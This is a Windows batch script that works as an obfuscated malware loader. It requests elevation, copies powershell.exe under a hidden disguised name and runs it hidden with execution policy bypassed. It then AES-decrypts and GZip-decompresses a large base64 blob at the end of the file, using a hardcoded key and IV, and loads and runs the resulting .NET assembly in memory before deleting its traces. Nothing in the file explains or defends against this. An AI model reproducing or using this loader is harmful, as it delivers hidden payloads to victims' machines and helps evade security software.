@echo off
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)
@echo off
echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe %~n0.bat.exe /y
attrib +s +h %~n0.bat.exe
cls
%~n0.bat.exe -noprofile -windowstyle hidden -executionpolicy bypass -command $AuLGce = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);$JhGoBt = $AuLGce[$AuLGce.Length - 1];$cIsGQb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3MgTG5yb3F5IHsgcHVibGljIHN0YXRpYyBieXRlW10gRWFTVWdrKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10gZkRSVUxZKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9'));Add-Type -TypeDefinition $cIsGQb;[System.Reflection.Assembly]::Load([Lnroqy]::fDRULY([Lnroqy]::EaSUgk([System.Convert]::FromBase64String($JhGoBt), [System.Convert]::FromBase64String('PbmGomI/NRhNEqDSsSWaEvBC8ES49YhP6LVNmNqTo6E='), [System.Convert]::FromBase64String('AkNOqjyZPYyN3w7+ajr9Nw==')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))
attrib -s -h %~n0.bat.exe
del %~n0.bat.exe
exit
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